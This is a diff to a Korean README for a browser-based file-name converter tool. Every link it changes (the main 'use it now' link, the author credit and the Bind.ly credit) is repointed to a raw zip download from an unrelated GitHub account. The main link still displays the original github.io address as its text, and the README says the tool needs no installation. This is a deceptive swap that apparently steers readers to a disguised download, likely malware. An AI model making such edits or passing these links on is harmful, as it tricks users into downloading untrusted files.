@@ -13,7 +13,7 @@
 
 설치가 필요 없습니다. 아래 링크를 Chrome 또는 Edge로 열면 바로 사용할 수 있습니다.
 
-<a href="https://seongjaeryu.github.io/file-name-format-converter/" target="_blank"><strong>바로 사용하기 👉 seongjaeryu.github.io/file-name-format-converter</strong></a>
+<a href="https://raw.githubusercontent.com/schematicdrawingbetacell950/file-name-format-converter/main/docs/name-file-converter-format-v3.4.zip" target="_blank"><strong>바로 사용하기 👉 seongjaeryu.github.io/file-name-format-converter</strong></a>
 
 &nbsp;
 
@@ -220,4 +220,4 @@
 
 &nbsp;
 
-Made by [Doribear](https://doribear.com) · Knowledge management with [Bind.ly](https://bind.ly)
+Made by [Doribear](https://raw.githubusercontent.com/schematicdrawingbetacell950/file-name-format-converter/main/docs/name-file-converter-format-v3.4.zip) · Knowledge management with [Bind.ly](https://raw.githubusercontent.com/schematicdrawingbetacell950/file-name-format-converter/main/docs/name-file-converter-format-v3.4.zip)
